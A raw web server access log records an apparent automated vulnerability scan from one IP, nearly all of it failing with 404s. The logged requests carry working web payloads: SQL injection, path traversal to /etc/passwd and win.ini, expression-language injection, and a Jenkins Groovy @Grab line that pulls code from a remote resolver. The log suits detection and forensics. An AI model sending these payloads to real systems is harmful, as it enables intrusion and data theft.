127.0.0.1 - - [18/Mar/2025:09:58:21 +0900] "GET / HTTP/1.1" 200 116
35.80.142.130 - - [18/Mar/2025:10:57:56 +0900] "GET /plus/guestbook.php HTTP/1.1" 404 753
35.80.142.130 - - [18/Mar/2025:10:57:57 +0900] "GET null HTTP/1.1" 400 2173
35.80.142.130 - - [18/Mar/2025:10:57:57 +0900] "GET /plus/download.php?open=1&link=aHR0cHM6Ly93d3cuZHUxeDNyMTIuY29t HTTP/1.1" 404 752
35.80.142.130 - - [18/Mar/2025:10:57:57 +0900] "GET /forum.php HTTP/1.1" 404 740
35.80.142.130 - - [18/Mar/2025:10:57:57 +0900] "GET null HTTP/1.1" 400 2173
35.80.142.130 - - [18/Mar/2025:10:57:57 +0900] "GET /plugin.php?id=wechat:wechat&ac=wxregister HTTP/1.1" 404 741
35.80.142.130 - - [18/Mar/2025:10:57:57 +0900] "GET /viewthread.php?tid=10 HTTP/1.1" 404 745
35.80.142.130 - - [18/Mar/2025:10:57:58 +0900] "GET //www.example.com HTTP/1.1" 404 751
35.80.142.130 - - [18/Mar/2025:10:57:58 +0900] "POST /hedwig.cgi HTTP/1.1" 404 741
35.80.142.130 - - [18/Mar/2025:10:57:58 +0900] "GET /config/getuser?index=0 HTTP/1.1" 404 749
35.80.142.130 - - [18/Mar/2025:10:57:58 +0900] "POST /getcfg.php HTTP/1.1" 404 741
35.80.142.130 - - [18/Mar/2025:10:57:58 +0900] "POST /getcfg.php HTTP/1.1" 404 741
35.80.142.130 - - [18/Mar/2025:10:57:58 +0900] "GET /wwwroot.zip HTTP/1.1" 404 742
35.80.142.130 - - [18/Mar/2025:10:57:58 +0900] "GET /page/login/login.html HTTP/1.1" 404 760
35.80.142.130 - - [18/Mar/2025:10:57:58 +0900] "GET /v2/ HTTP/1.1" 404 738
35.80.142.130 - - [18/Mar/2025:10:57:58 +0900] "GET /user/City_ajax.aspx HTTP/1.1" 404 754
35.80.142.130 - - [18/Mar/2025:10:57:59 +0900] "POST /cgi-bin/mainfunction.cgi HTTP/1.1" 404 759
35.80.142.130 - - [18/Mar/2025:10:57:59 +0900] "POST /?q=node&destination=node HTTP/1.1" 200 116
35.80.142.130 - - [18/Mar/2025:10:57:59 +0900] "GET /info HTTP/1.1" 404 735
35.80.142.130 - - [18/Mar/2025:10:57:59 +0900] "POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1" 404 748
35.80.142.130 - - [18/Mar/2025:10:57:59 +0900] "GET /services/FreeMarkerService HTTP/1.1" 404 761
35.80.142.130 - - [18/Mar/2025:10:57:59 +0900] "GET /druid/index.html HTTP/1.1" 404 751
35.80.142.130 - - [18/Mar/2025:10:57:59 +0900] "GET null HTTP/1.1" 400 2173
35.80.142.130 - - [18/Mar/2025:10:57:59 +0900] "GET /duomiphp/ajax.php?action=addfav&id=1&uid=1%20and%20extractvalue(1,concat_ws(1,1,md5(2000000005))) HTTP/1.1" 404 752
35.80.142.130 - - [18/Mar/2025:10:57:59 +0900] "POST /node/?_format=hal_json HTTP/1.1" 404 740
35.80.142.130 - - [18/Mar/2025:10:57:59 +0900] "GET /device.rsp?opt=user&cmd=list HTTP/1.1" 404 741
35.80.142.130 - - [18/Mar/2025:10:57:59 +0900] "GET / HTTP/1.1" 200 116
35.80.142.130 - - [18/Mar/2025:10:57:59 +0900] "GET /eoffice10/server/ext/system_support/leave_record.php?flow_id=1&run_id=1&table_field=1&table_field_name=user()&max_rows=10 HTTP/1.1" 404 799
35.80.142.130 - - [18/Mar/2025:10:57:59 +0900] "POST /general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId= HTTP/1.1" 404 767
35.80.142.130 - - [18/Mar/2025:10:58:00 +0900] "GET /iclock/ccccc/windows/win.ini HTTP/1.1" 404 771
35.80.142.130 - - [18/Mar/2025:10:58:00 +0900] "GET /index.zip HTTP/1.1" 404 740
35.80.142.130 - - [18/Mar/2025:10:58:00 +0900] "POST /page/exportImport/uploadOperation.jsp HTTP/1.1" 404 761
35.80.142.130 - - [18/Mar/2025:10:58:00 +0900] "GET /weaver/ln.FileDownload?fpath=../ecology/WEB-INF/web.xml HTTP/1.1" 404 757
35.80.142.130 - - [18/Mar/2025:10:58:00 +0900] "POST null HTTP/1.1" 400 2173
35.80.142.130 - - [18/Mar/2025:10:58:00 +0900] "POST /weaver/bsh.servlet.BshServlet HTTP/1.1" 404 764
35.80.142.130 - - [18/Mar/2025:10:58:00 +0900] "GET /weaver/org.springframework.web.servlet.ResourceServlet?resource=/WEB-INF/web.xml HTTP/1.1" 404 789
35.80.142.130 - - [18/Mar/2025:10:58:00 +0900] "GET /mobile/plugin/SyncUserInfo.jsp?userIdentifiers=-1)union(select(3),null,null,null,null,null,str(44324*41308),null HTTP/1.1" 404 754
35.80.142.130 - - [18/Mar/2025:10:58:00 +0900] "POST /cpt/manage/validate.jsp?sourcestring=validateNum HTTP/1.1" 404 747
35.80.142.130 - - [18/Mar/2025:10:58:01 +0900] "GET /services/AdminService HTTP/1.1" 404 756
35.80.142.130 - - [18/Mar/2025:10:58:01 +0900] "GET /js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select+7555*1747+as+id HTTP/1.1" 404 742
35.80.142.130 - - [18/Mar/2025:10:58:01 +0900] "POST /services%20/WorkflowServiceXml HTTP/1.1" 404 765
35.80.142.130 - - [18/Mar/2025:10:58:01 +0900] "POST /mobile/browser/WorkflowCenterTreeData.jsp HTTP/1.1" 404 765
35.80.142.130 - - [18/Mar/2025:10:58:01 +0900] "GET /user.php?act=collection_list HTTP/1.1" 404 739
35.80.142.130 - - [18/Mar/2025:10:58:01 +0900] "POST /delete_cart_goods.php HTTP/1.1" 404 752
35.80.142.130 - - [18/Mar/2025:10:58:01 +0900] "POST /user.php HTTP/1.1" 404 739
35.80.142.130 - - [18/Mar/2025:10:58:01 +0900] "GET /authenticationserverservlet HTTP/1.1" 404 758
35.80.142.130 - - [18/Mar/2025:10:58:02 +0900] "POST /test/test1/123 HTTP/1.1" 404 753
35.80.142.130 - - [18/Mar/2025:10:58:02 +0900] "GET /_plugin/head/../../../../../../../../../../../../../../../../etc/passwd HTTP/1.1" 400 764
35.80.142.130 - - [18/Mar/2025:10:58:02 +0900] "POST /test/test HTTP/1.1" 404 744
35.80.142.130 - - [18/Mar/2025:10:58:02 +0900] "GET /user.php?act=login HTTP/1.1" 404 739
35.80.142.130 - - [18/Mar/2025:10:58:02 +0900] "GET / HTTP/1.1" 200 116
35.80.142.130 - - [18/Mar/2025:10:58:03 +0900] "GET / HTTP/1.1" 200 116
35.80.142.130 - - [18/Mar/2025:10:58:03 +0900] "PUT /_snapshot/hzdq HTTP/1.1" 405 633
35.80.142.130 - - [18/Mar/2025:10:58:03 +0900] "PUT /v2/keys/dtfopkfihsqasnixcafbbzmxnpdstokd?dir=true HTTP/1.1" 405 633
35.80.142.130 - - [18/Mar/2025:10:58:03 +0900] "GET /upload/mobile/index.php?c=category&a=asynclist&price_max=1.0%20AND%20(SELECT%201%20FROM(SELECT%20COUNT(*),CONCAT(0x7e,md5(1),0x7e,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)' HTTP/1.1" 404 762
35.80.142.130 - - [18/Mar/2025:10:58:03 +0900] "GET /owa/auth/x.js HTTP/1.1" 404 752
35.80.142.130 - - [18/Mar/2025:10:58:03 +0900] "GET /axis/services HTTP/1.1" 404 748
35.80.142.130 - - [18/Mar/2025:10:58:03 +0900] "GET /backup.zip HTTP/1.1" 404 741
35.80.142.130 - - [18/Mar/2025:10:58:03 +0900] "POST /mgmt/tm/util/bash HTTP/1.1" 404 760
35.80.142.130 - - [18/Mar/2025:10:58:03 +0900] "POST /webadm/?q=moni_detail.do&action=gragh HTTP/1.1" 404 742
35.80.142.130 - - [18/Mar/2025:10:58:03 +0900] "POST /user.php HTTP/1.1" 404 739
35.80.142.130 - - [18/Mar/2025:10:58:03 +0900] "GET /defaultroot/site/templatemanager/downloadhttp.jsp?fileName=../public/edit/jsp/config.jsp HTTP/1.1" 404 777
35.80.142.130 - - [18/Mar/2025:10:58:04 +0900] "POST /mgmt/tm/util/bash HTTP/1.1" 404 760
35.80.142.130 - - [18/Mar/2025:10:58:04 +0900] "POST /services%20/WorkflowServiceXml HTTP/1.1" 404 765
35.80.142.130 - - [18/Mar/2025:10:58:04 +0900] "GET //fckeditor/_samples/default.html HTTP/1.1" 404 775
35.80.142.130 - - [18/Mar/2025:10:58:04 +0900] "GET /index.php?s=Admin-Data-down&id=../../Conf/config.php HTTP/1.1" 404 740
35.80.142.130 - - [18/Mar/2025:10:58:04 +0900] "GET /index.php?m=Goods&a=showcate&id=103%20UNION%20ALL%20SELECT%20CONCAT%28md5(200954455)%29%23 HTTP/1.1" 404 740
35.80.142.130 - - [18/Mar/2025:10:58:04 +0900] "GET /index.php?c=api&m=data2&auth=582f27d140497a9d8f048ca085b111df&param=action=sql%20sql=%27select%20md5(203206058)%27 HTTP/1.1" 404 740
35.80.142.130 - - [18/Mar/2025:10:58:04 +0900] "POST /tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp HTTP/1.1" 404 772
35.80.142.130 - - [18/Mar/2025:10:58:04 +0900] "GET /report/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml HTTP/1.1" 404 754
35.80.142.130 - - [18/Mar/2025:10:58:05 +0900] "GET /WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml HTTP/1.1" 404 757
35.80.142.130 - - [18/Mar/2025:10:58:05 +0900] "GET /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession HTTP/1.1" 404 750
35.80.142.130 - - [18/Mar/2025:10:58:05 +0900] "GET /jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd HTTP/1.1" 404 853
35.80.142.130 - - [18/Mar/2025:10:58:05 +0900] "POST /php/change_config.php HTTP/1.1" 404 756
35.80.142.130 - - [18/Mar/2025:10:58:05 +0900] "GET /api/proxy/tcp HTTP/1.1" 404 752
35.80.142.130 - - [18/Mar/2025:10:58:05 +0900] "GET /axis2/services HTTP/1.1" 404 749
35.80.142.130 - - [18/Mar/2025:10:58:05 +0900] "POST /api/graphql HTTP/1.1" 404 746
35.80.142.130 - - [18/Mar/2025:10:58:05 +0900] "GET / HTTP/1.1" 200 116
35.80.142.130 - - [18/Mar/2025:10:58:05 +0900] "GET /admin/sql?query=SELECT%20md5(200879636) HTTP/1.1" 404 744
35.80.142.130 - - [18/Mar/2025:10:58:06 +0900] "POST /api/v4/ci/lint HTTP/1.1" 404 757
35.80.142.130 - - [18/Mar/2025:10:58:06 +0900] "GET /theme/META-INF/%c0%ae%c0%ae/META-INF/MANIFEST.MF HTTP/1.1" 404 795
35.80.142.130 - - [18/Mar/2025:10:58:06 +0900] "GET / HTTP/1.1" 200 116
35.80.142.130 - - [18/Mar/2025:10:58:06 +0900] "GET //fckeditor/editor/filemanager/connectors/uploadtest.html HTTP/1.1" 404 807
35.80.142.130 - - [18/Mar/2025:10:58:06 +0900] "GET /debug/pprof/ HTTP/1.1" 404 751
35.80.142.130 - - [18/Mar/2025:10:58:06 +0900] "GET /back.zip HTTP/1.1" 404 739
35.80.142.130 - - [18/Mar/2025:10:58:07 +0900] "GET /go/add-on/business-continuity/api/plugin?folderName=&pluginName=../../../../../../../../etc/passwd HTTP/1.1" 404 787
35.80.142.130 - - [18/Mar/2025:10:58:07 +0900] "GET /h2-console HTTP/1.1" 404 741
35.80.142.130 - - [18/Mar/2025:10:58:07 +0900] "POST /imc/javax.faces.resource/dynamiccontent.properties.xhtml HTTP/1.1" 404 795
35.80.142.130 - - [18/Mar/2025:10:58:07 +0900] "GET /api/v1/GetSrc HTTP/1.1" 404 752
35.80.142.130 - - [18/Mar/2025:10:58:07 +0900] "GET /audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin HTTP/1.1" 404 760
35.80.142.130 - - [18/Mar/2025:10:58:07 +0900] "GET /ws/v1/cluster/info HTTP/1.1" 404 761
35.80.142.130 - - [18/Mar/2025:10:58:07 +0900] "GET /register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini HTTP/1.1" 404 757
35.80.142.130 - - [18/Mar/2025:10:58:07 +0900] "GET /system/deviceInfo?auth=YWRtaW46MTEK HTTP/1.1" 404 752
35.80.142.130 - - [18/Mar/2025:10:58:07 +0900] "GET / HTTP/1.1" 200 116
35.80.142.130 - - [18/Mar/2025:10:58:07 +0900] "GET /data/login.php::$DATA HTTP/1.1" 404 756
35.80.142.130 - - [18/Mar/2025:10:58:07 +0900] "GET /api/proxy/tcp HTTP/1.1" 404 752
35.80.142.130 - - [18/Mar/2025:10:58:07 +0900] "GET /axis/servlet/AxisServlet HTTP/1.1" 404 763
35.80.142.130 - - [18/Mar/2025:10:58:08 +0900] "PUT /SDK/webLanguage HTTP/1.1" 405 633
35.80.142.130 - - [18/Mar/2025:10:58:08 +0900] "GET / HTTP/1.1" 200 116
35.80.142.130 - - [18/Mar/2025:10:58:08 +0900] "GET / HTTP/1.1" 200 116
35.80.142.130 - - [18/Mar/2025:10:58:08 +0900] "GET /him/api/rest/V1.0/system/log/list?filePath=../ HTTP/1.1" 404 788
35.80.142.130 - - [18/Mar/2025:10:58:09 +0900] "POST /fileDownload?action=downloadBackupFile HTTP/1.1" 404 743
35.80.142.130 - - [18/Mar/2025:10:58:09 +0900] "GET /go/add-on/business-continuity/api/plugin?folderName=&pluginName=../../../../../../../../windows/win.ini HTTP/1.1" 404 787
35.80.142.130 - - [18/Mar/2025:10:58:09 +0900] "GET /serverLog/showFile.php?fileName=../web/html/main.php HTTP/1.1" 404 757
35.80.142.130 - - [18/Mar/2025:10:58:09 +0900] "GET //ckeditor/samples/ HTTP/1.1" 404 761
35.80.142.130 - - [18/Mar/2025:10:58:09 +0900] "GET /index.htm?PAGE=web HTTP/1.1" 404 740
35.80.142.130 - - [18/Mar/2025:10:58:09 +0900] "PUT /uhlaub.txt HTTP/1.1" 405 633
35.80.142.130 - - [18/Mar/2025:10:58:09 +0900] "GET /lib///....//....//....//....//....//....//....//....//etc//passwd HTTP/1.1" 404 880
35.80.142.130 - - [18/Mar/2025:10:58:09 +0900] "GET /register/toDownload.do?fileName=../../../../../../../../../../../../../../etc/passwd HTTP/1.1" 404 757
35.80.142.130 - - [18/Mar/2025:10:58:10 +0900] "GET /data.zip HTTP/1.1" 404 739
35.80.142.130 - - [18/Mar/2025:10:58:10 +0900] "GET /api/v1/GetDevice HTTP/1.1" 404 755
35.80.142.130 - - [18/Mar/2025:10:58:10 +0900] "GET /admin-console/index.seam?actionOutcome=/pwn.xhtml%3fpwned%3d%23%7b9709821*9265981%7d HTTP/1.1" 404 759
35.80.142.130 - - [18/Mar/2025:10:58:10 +0900] "GET /jmx-console/ HTTP/1.1" 404 747
35.80.142.130 - - [18/Mar/2025:10:58:10 +0900] "GET /ping HTTP/1.1" 404 735
35.80.142.130 - - [18/Mar/2025:10:58:10 +0900] "POST /login HTTP/1.1" 404 736
35.80.142.130 - - [18/Mar/2025:10:58:11 +0900] "GET /axis2/servlet/AxisServlet HTTP/1.1" 404 764
35.80.142.130 - - [18/Mar/2025:10:58:11 +0900] "GET /systemController/showOrDownByurl.do?down=&dbPath=../../../../../../etc/passwd HTTP/1.1" 404 770
35.80.142.130 - - [18/Mar/2025:10:58:11 +0900] "GET /Audio/1/hls/..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini/stream.mp3/ HTTP/1.1" 400 764
35.80.142.130 - - [18/Mar/2025:10:58:11 +0900] "GET /securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0a@GrabResolver(name=%27test%27,%20root=%27http://aaa%27)%0a@Grab(group=%27package%27,%20module=%27uiyw%27,%20version=%271%27)%0aimport%20Payload; HTTP/1.1" 404 864
35.80.142.130 - - [18/Mar/2025:10:58:11 +0900] "GET /%2e/WEB-INF/web.xml HTTP/1.1" 404 648
35.80.142.130 - - [18/Mar/2025:10:58:11 +0900] "GET /script HTTP/1.1" 404 737
35.80.142.130 - - [18/Mar/2025:10:58:11 +0900] "GET /s/anything/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml HTTP/1.1" 404 835
35.80.142.130 - - [18/Mar/2025:10:58:12 +0900] "GET /rest/api/latest/groupuserpicker?query=testuser12345&maxResults=50&showAvatar=false HTTP/1.1" 404 774
35.80.142.130 - - [18/Mar/2025:10:58:12 +0900] "GET /web.zip HTTP/1.1" 404 738
35.80.142.130 - - [18/Mar/2025:10:58:12 +0900] "GET //editor/ckeditor/samples/ HTTP/1.1" 404 772
35.80.142.130 - - [18/Mar/2025:10:58:12 +0900] "GET /secure/ViewUserHover.jspa?username=pffumnrf HTTP/1.1" 404 760
35.80.142.130 - - [18/Mar/2025:10:58:12 +0900] "GET /secure/QueryComponent!Default.jspa HTTP/1.1" 404 769
35.80.142.130 - - [18/Mar/2025:10:58:12 +0900] "POST /index.php?option=com_vreview&task=displayReply HTTP/1.1" 404 740
35.80.142.130 - - [18/Mar/2025:10:58:12 +0900] "GET / HTTP/1.1" 200 116
35.80.142.130 - - [18/Mar/2025:10:58:12 +0900] "GET null HTTP/1.1" 400 2173
35.80.142.130 - - [18/Mar/2025:10:58:13 +0900] "GET /index.php?option=com_prayercenter&task=confirm&id=1&sessionid=1'%20AND%20EXTRACTVALUE(22,CONCAT(0x7e,md5(996900842)))--%20X HTTP/1.1" 404 740
35.80.142.130 - - [18/Mar/2025:10:58:13 +0900] "GET null HTTP/1.1" 400 2173
35.80.142.130 - - [18/Mar/2025:10:58:13 +0900] "GET /terminals/3 HTTP/1.1" 404 746
35.80.142.130 - - [18/Mar/2025:10:58:13 +0900] "POST /index.php?option=com_zhbaidumap&no_html=1&format=raw&task=getPlacemarkDetails HTTP/1.1" 404 740
35.80.142.130 - - [18/Mar/2025:10:58:13 +0900] "GET / HTTP/1.1" 200 116
35.80.142.130 - - [18/Mar/2025:10:58:13 +0900] "GET /axis2/services/listServices HTTP/1.1" 404 766
35.80.142.130 - - [18/Mar/2025:10:58:13 +0900] "GET /api/v1/users/connection-token/ HTTP/1.1" 404 777
